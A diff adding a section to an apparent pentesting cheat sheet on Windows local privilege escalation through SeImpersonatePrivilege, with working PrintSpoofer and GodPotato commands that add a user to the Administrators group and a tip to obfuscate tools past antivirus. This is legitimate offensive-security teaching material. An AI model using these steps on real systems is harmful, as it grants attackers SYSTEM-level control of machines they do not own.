@@ -267,6 +267,103 @@ Step	Action
 5️⃣	Reuse hashes with Evil-WinRM, CrackMapExec, or PsExec for lateral movement or privilege escalation
 
  </details>
+
+ <details>
+<summary>SeImpersonatePrivilege</summary>
+ <br>
+🔍 What is SeImpersonatePrivilege?
+The SeImpersonatePrivilege is a powerful permission in Windows that allows a user to impersonate the security context of another user. This is typically used by services to act on behalf of a client.
+
+✅ If a low-privileged user account has SeImpersonatePrivilege, it can often be exploited to escalate to SYSTEM or Administrator using various impersonation attacks.
+
+🧠 Why is it dangerous?
+This privilege allows attackers to impersonate privileged tokens (like SYSTEM or admin) when certain services or RPC endpoints allow it.
+
+It is commonly exploited in local privilege escalation (LPE) scenarios.
+
+🔍 Identifying SeImpersonatePrivilege
+Run this on the target system (PowerShell):
+
+powershell
+
+    whoami /priv | findstr SeImpersonatePrivilege
+If you see it as Enabled, you can likely proceed with known exploits.
+<img width="1041" height="362" alt="image" src="https://github.com/user-attachments/assets/aeb520d9-af88-4719-b8cb-4707dcabfedb" />
+
+⚙️ Exploitation Tools
+🔧 1. PrintSpoofer
+PrintSpoofer abuses the SeImpersonatePrivilege via the Print Spooler service to impersonate SYSTEM.
+
+🧪 Steps:
+Upload the executable to the target system:
+
+powershell
+
+    upload PrintSpoofer.exe
+<img width="1064" height="178" alt="image" src="https://github.com/user-attachments/assets/7d0e6a51-a786-4ae1-85a7-c54c65220d4c" />
+    
+Run PrintSpoofer to add your user to the Administrators group:
+
+powershell
+
+    .\PrintSpoofer.exe -i -c "net localgroup Administrators <user-name> /add"
+-i → impersonate token
+
+-c → command to execute as SYSTEM
+<img width="1025" height="77" alt="image" src="https://github.com/user-attachments/assets/fed9f6a6-9e19-4292-9e6d-03c5d0059f91" />
+
+✅ Your user is now part of the Administrators group.
+
+🔧 2. GodPotato
+GodPotato is a modern implementation of the RottenPotatoNG/JuicyPotato concept, abusing COM/RPC misconfigurations and SeImpersonate privilege to execute commands as SYSTEM.
+
+🧪 Steps:
+Upload the GodPotato executable:
+
+powershell
+
+    upload GodPotato-NET4.exe
+Execute the command to add your user to the Administrators group:
+
+powershell
+
+.\GodPotato-NET4.exe -cmd "cmd /c net localgroup Administrators r.andrews /add"
+✅ Once executed successfully, the user is elevated.
+<img width="1052" height="574" alt="image" src="https://github.com/user-attachments/assets/ef72d9f6-4d43-45c8-8f50-7cca73d7e933" />
+
+✅ Confirming Privilege Escalation
+You can now verify that your user has admin access:
+
+powershell
+
+whoami /groups
+net user <user-name>
+Or list protected directories:
+
+powershell
+
+dir C:\Users\Administrator\
+📌 Notes:
+These exploits work only locally and require SeImpersonatePrivilege.
+
+These tools may trigger EDR/AV, so obfuscation or alternative binaries might be needed.
+
+Not all Windows builds are vulnerable; ensure the Print Spooler or vulnerable COM servers are available.
+
+🧰 Alternative Tools & Techniques
+Tool	Description
+JuicyPotato	Legacy COM exploit, works only on older versions
+RoguePotato	Bypasses newer Windows protections
+PrintSpoofer	Exploits Print Spooler to impersonate SYSTEM
+GodPotato	Updated COM exploit using .NET
+
+📚 References
+https://github.com/itm4n/PrintSpoofer
+
+https://github.com/BeichenDream/GodPotato
+
+  </details>
+  
 <details>
 <summary>Unquoted Service Pathss</summary>
  <br> 
